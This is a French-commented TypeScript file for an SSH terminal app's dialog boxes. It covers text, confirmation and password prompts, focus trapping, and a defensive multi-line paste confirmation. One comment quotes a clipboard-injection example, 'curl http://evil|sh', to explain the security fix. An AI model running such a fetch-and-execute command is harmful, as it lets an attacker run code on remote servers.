// Boîtes de dialogue maison : saisie de texte, confirmation, mot de passe, accessibilité (piège de focus, Échap).

import type { Terminal } from "@xterm/xterm";
import { getVersion } from "@tauri-apps/api/app";
import { effectuerCollage } from "./collage";
import { $ } from "./etat";
import { t } from "./i18n";

// ---------- Saisie d'un texte (nom de fichier, de dossier) ----------

let askResolve: ((v: string | null) => void) | null = null;

export function askText(title: string, label: string, initial: string): Promise<string | null> {
  $("ask-title").textContent = title;
  $("ask-label").textContent = label;
  const input = $("ask-input") as HTMLInputElement;
  input.value = initial;
  $("ask-error").hidden = true;
  $("ask-modal").classList.add("open");
  setTimeout(() => {
    input.focus();
    // Renommer : on selectionne le nom sans l'extension.
    const dot = initial.lastIndexOf(".");
    input.setSelectionRange(0, dot > 0 ? dot : initial.length);
  }, 30);
  // Une demande déjà en attente doit être close, sinon son résolveur est
  // écrasé et sa promesse n'est jamais tenue : l'appelant reste bloqué à
  // jamais — un onglet figé sur « Connexion en cours… », une closure qui ne se
  // libère pas. Deux double-clics rapides suffisaient.
  askResolve?.(null);
  return new Promise((resolve) => { askResolve = resolve; });
}
function askClose(v: string | null) {
  $("ask-modal").classList.remove("open");
  const r = askResolve;
  askResolve = null;
  r?.(v);
}
$("ask-form").addEventListener("submit", (e) => {
  e.preventDefault();
  askClose(($("ask-input") as HTMLInputElement).value.trim());
});
$("ask-cancel").addEventListener("click", () => askClose(null));
window.addEventListener("keydown", (e) => {
  if (e.key !== "Escape" || !$("ask-modal").classList.contains("open")) return;
  e.stopImmediatePropagation(); // voir la note du gestionnaire de confirmation
  askClose(null);
});

// Confirmation maison. La fonction native du navigateur est INOPÉRANTE sous
// WebKitGTK/WRY : elle ne bloque plus et renvoie une Promise (toujours vraie),
// si bien que le test « si l'utilisateur refuse » ne s'arrêtait jamais et que
// les suppressions passaient sans confirmation. Cette modale, elle, attend
// vraiment le choix de l'utilisateur (comme askText remplace prompt).
// Convention : la 1re ligne du texte est le titre, le reste le détail.
// Colle du texte dans un terminal distant, TOUJOURS via term.paste() — jamais
// en écrivant les octets bruts dans pty_write. La différence est de sécurité :
// term.paste() encadre le texte en « bracketed paste » quand le shell distant
// l'a demandé (DECSET 2004), ce qui empêche un saut de ligne collé de s'exécuter
// tout seul. Écrire les octets bruts (ce que faisaient Ctrl+Maj+V et le menu
// « Coller ») court-circuitait cette protection : une page web hostile plaçant
// « cmd\ncurl http://evil|sh\n » dans le presse-papiers faisait exécuter la
// seconde ligne sur le serveur, invisible. Le collage natif (événement `paste`,
// que xterm envoie à onData) n'était PAS protégé pour autant : il échappait à la
// confirmation, d'où intercepterCollageNatif plus bas (audit du 12 septembre
// 2026, FS-2). On confirme tout collage multi-ligne, car le distant peut ne pas
// avoir activé le bracketed paste.
// La décision (vide → rien ; multi-ligne → confirmer ; puis coller) vit dans
// effectuerCollage, pure et testée ; ici on ne fait que brancher term.paste et
// la modale de confirmation.
// Seul `paste` est lu : le type le dit, et les tests passent un double minimal.
export function collerDansTerminal(term: Pick<Terminal, "paste">, texte: string): Promise<void> {
  return effectuerCollage(texte, {
    coller: (t) => term.paste(t),
    confirmer: (n) =>
      askConfirm(
        t(n > 1 ? "collage-question-pluriel" : "collage-question", { n }) + "\n\n" + t("collage-avertissement"),
        { ok: t("coller"), danger: true },
      ),
  });
}

/** Fait passer tout collage NATIF dans `el` (Maj+Inser, clic du milieu, menu
 *  contextuel du navigateur, événement `paste`) par `collerDansTerminal`.
 *
 *  Audit sécurité du front du 12 septembre 2026 (FS-2) : xterm écoute `paste`
 *  sur sa zone de saisie et envoie le texte droit à `onData`, donc à
 *  `pty_write`, sans la confirmation multi-ligne que Ctrl+Maj+V impose. Le
 *  commentaire ci-dessus disait ce chemin « protégé » par le bracketed paste :
 *  il ne l'est que si le distant l'a activé, et le texte peut refermer le bloc
 *  (FS-1). L'écouteur est posé en CAPTURE sur le conteneur : il passe avant
 *  celui de xterm, placé plus bas dans l'arbre, et `stopImmediatePropagation`
 *  l'empêche de l'atteindre. `preventDefault` retient l'insertion native. */
export function intercepterCollageNatif(el: HTMLElement, term: Pick<Terminal, "paste">): void {
  el.addEventListener(
    "paste",
    (ev) => {
      ev.preventDefault();
      ev.stopImmediatePropagation();
      void collerDansTerminal(term, ev.clipboardData?.getData("text/plain") ?? "");
    },
    true,
  );
}

let confirmResolve: ((v: boolean) => void) | null = null;
export function askConfirm(text: string, opts: { ok?: string; danger?: boolean } = {}): Promise<boolean> {
  const [title, ...rest] = text.split("\n\n");
  $("confirm-title").textContent = title;
  const msg = $("confirm-message");
  msg.textContent = rest.join("\n\n");
  msg.hidden = rest.length === 0;
  const okBtn = $("confirm-ok") as HTMLButtonElement;
  // Trouvé par l'audit du 7 septembre 2026 : le libellé par défaut était écrit
  // en dur (« Confirmer »), ce qui écrasait à chaque confirmation la traduction
  // posée par data-i18n. En interface anglaise, toute suppression sans option
  // `ok` affichait « Confirmer » face à « Cancel ». On passe par t("confirmer").
  okBtn.textContent = opts.ok ?? t("confirmer");
  // Rouge par défaut : la plupart des confirmations gardent une action destructive.
  const dangereux = opts.danger !== false;
  okBtn.classList.toggle("btn-danger", dangereux);
  $("confirm-modal").classList.add("open");
  // Une confirmation destructive ne pré-focalise pas son bouton rouge : Entrée
  // par réflexe, ou restée enfoncée depuis l'action précédente, supprimait un
  // hôte de ~/.ssh/config avant qu'on ait lu la phrase d'avertissement.
  setTimeout(() => (dangereux ? ($("confirm-cancel") as HTMLButtonElement) : okBtn).focus(), 30);
  confirmResolve?.(false); // cf. askText : ne jamais abandonner une promesse
  return new Promise((resolve) => { confirmResolve = resolve; });
}
function confirmClose(v: boolean) {
  $("confirm-modal").classList.remove("open");
  const r = confirmResolve;
  confirmResolve = null;
  r?.(v);
}
$("confirm-ok").addEventListener("click", () => confirmClose(true));
$("confirm-cancel").addEventListener("click", () => confirmClose(false));
window.addEventListener("keydown", (e) => {
  if (!$("confirm-modal").classList.contains("open")) return;
  if (e.key !== "Escape" && e.key !== "Enter") return;
  // La touche s'arrête ici. Sans cela, le gestionnaire d'Échap déclaré plus bas
  // s'exécutait aussi — et comme cette boîte venait de se refermer, il fermait
  // la fenêtre du dessous : renoncer à une suppression faisait disparaître la
  // fenêtre Tunnels ou Snippets d'où l'on venait.
  e.stopImmediatePropagation();
  e.preventDefault();
  // Entrée suit le bouton focalisé au lieu de valider d'office : sur une
  // confirmation destructive, le focus est sur « Annuler ».
  confirmClose(e.key === "Enter" && document.activeElement === $("confirm-ok"));
});


// ---------- Accessibilité des boîtes de dialogue ----------
// Les modales s'ouvrent en posant la classe « open », depuis une quarantaine
// d'endroits. Plutôt que d'instrumenter chaque appel, on observe la classe :
//  - à l'ouverture, on mémorise l'élément qui avait le focus ;
//  - à la fermeture, on le lui rend (sinon le focus retombe sur le <body> et la
//    navigation au clavier repart du début de la page) ;
//  - tant qu'une modale est ouverte, Tab et Maj+Tab bouclent à l'intérieur : la
//    page derrière est masquée visuellement mais reste sinon atteignable.
const FOCUSABLE =
  'a[href], button:not([disabled]), input:not([disabled]), select:not([disabled]),' +
  ' textarea:not([disabled]), [tabindex]:not([tabindex="-1"])';

/** Éléments réellement atteignables (on écarte ceux que le CSS masque). */
function focusablesIn(box: HTMLElement): HTMLElement[] {
  return [...box.querySelectorAll<HTMLElement>(FOCUSABLE)].filter(
    (el) => el.offsetParent !== null || el === document.activeElement,
  );
}

/** La boîte de dialogue actuellement ouverte, s'il y en a une. */
/// Boîtes qui s'ouvrent systématiquement par-dessus une autre.
// send-modal et sftp-copier-modal ajoutés EN FIN de liste (audit du 7 septembre
// 2026) : eux aussi s'ouvrent toujours par-dessus une autre surface. Garde
// jumelle du stopImmediatePropagation de leurs gestionnaires d'Échap, pour que
// menu-hote ne ferme pas le dessous quel que soit l'ordre d'enregistrement des
// écouteurs. En fin de liste, confirm/ask/pass gardent la priorité du piège de
// focus (openDialogBox) s'ils s'ouvrent encore par-dessus ces deux-là.
export const MODALES_AU_DESSUS = ["confirm-modal", "ask-modal", "pass-modal", "send-modal", "sftp-copier-modal"] as const;

function openDialogBox(): HTMLElement | null {
  // Ces trois-là priment : `querySelector` rendait la PREMIÈRE du document, or
  // « tunnels » et « snippets » y précèdent « confirmation ». Le piège de focus
  // enfermait donc Tab dans le formulaire resté derrière la confirmation.
  for (const id of MODALES_AU_DESSUS) {
    const el = document.getElementById(id);
    if (el?.classList.contains("open")) {
      return el.querySelector<HTMLElement>('[role="dialog"]') ?? el;
    }
  }
  const ouvertes = [
    ...document.querySelectorAll<HTMLElement>(".modal-backdrop.open, .palette-backdrop.open"),
  ];
  const back = ouvertes.at(-1) ?? null;
  return back ? (back.querySelector<HTMLElement>('[role="dialog"]') ?? back) : null;
}

window.addEventListener(
  "keydown",
  (e) => {
    if (e.key !== "Tab") return;
    const box = openDialogBox();
    if (!box) return;
    const items = focusablesIn(box);
    if (items.length === 0) return;
    const first = items[0];
    const last = items[items.length - 1];
    const cur = document.activeElement as HTMLElement | null;
    const inside = cur ? box.contains(cur) : false;
    if (e.shiftKey && (cur === first || !inside)) {
      e.preventDefault();
      last.focus();
    } else if (!e.shiftKey && (cur === last || !inside)) {
      e.preventDefault();
      first.focus();
    }
  },
  true, // en capture : on passe avant les raccourcis des champs
);

// Le déclencheur ne peut pas être lu au moment de l'ouverture : le code qui
// ouvre une modale y place aussitôt le focus (champ de saisie), et l'observateur
// ci-dessous ne s'exécute qu'ensuite (microtâche). On garde donc en permanence
// le dernier élément focalisé HORS dialogue : c'est lui, le déclencheur.
let lastOutsideFocus: HTMLElement | null = null;
window.addEventListener("focusin", (e) => {
  const el = e.target as HTMLElement | null;
  if (el && !el.closest(".modal-backdrop, .palette-backdrop")) lastOutsideFocus = el;
});

for (const back of document.querySelectorAll<HTMLElement>(".modal-backdrop, .palette-backdrop")) {
  let opener: HTMLElement | null = null;
  new MutationObserver(() => {
    const isOpen = back.classList.contains("open");
    if (isOpen) {
      opener ??= lastOutsideFocus;
    } else if (opener) {
      // Le focus était dans la modale qui vient de se fermer : on le rend au
      // déclencheur, s'il est encore dans le document.
      if (opener.isConnected) opener.focus();
      opener = null;
    }
  }).observe(back, { attributes: true, attributeFilter: ["class"] });
}

// Version affichee (barre laterale + pied) : lue depuis l'app, jamais ecrite en
// dur — sinon elle derive a chaque release.
void getVersion()
  .then((v) => {
    $("app-version").textContent = `v${v}`;
    $("footer-version").textContent = `avash v${v}`;
  })
  .catch(() => {
    $("app-version").textContent = "v?";
  });

// ---------- Demande de mot de passe ----------

const passModal = () => $("pass-modal");
let passResolve: ((v: { password: string; remember: boolean } | null) => void) | null = null;

/**
 * Demande un mot de passe et rend la reponse.
 *
 * Rend `null` si l'utilisateur annule — l'appelant doit alors renoncer
 * proprement plutot que de tenter une connexion sans identifiant.
 */
export function askPassword(target: string, erreur?: string): Promise<{ password: string; remember: boolean } | null> {
  $("pass-target").textContent = target;
  ($("pass-input") as HTMLInputElement).value = "";
  ($("pass-remember") as HTMLInputElement).checked = false;
  const err = $("pass-error");
  if (erreur) {
    err.textContent = erreur;
    err.hidden = false;
  } else {
    err.hidden = true;
  }
  passModal().classList.add("open");
  setTimeout(() => ($("pass-input") as HTMLInputElement).focus(), 30);
  return new Promise((resolve) => {
    passResolve?.(null); // cf. askText : ne jamais abandonner une promesse
    passResolve = resolve;
  });
}

function passClose(value: { password: string; remember: boolean } | null) {
  passModal().classList.remove("open");
  const r = passResolve;
  passResolve = null;
  r?.(value);
}

$("pass-form").addEventListener("submit", (e) => {
  e.preventDefault();
  passClose({
    password: ($("pass-input") as HTMLInputElement).value,
    remember: ($("pass-remember") as HTMLInputElement).checked,
  });
});
$("pass-cancel").addEventListener("click", () => passClose(null));
window.addEventListener("keydown", (e) => {
  if (e.key === "Escape" && passModal().classList.contains("open")) {
    e.stopImmediatePropagation(); // voir la note du gestionnaire de confirmation
    passClose(null);
  }
});
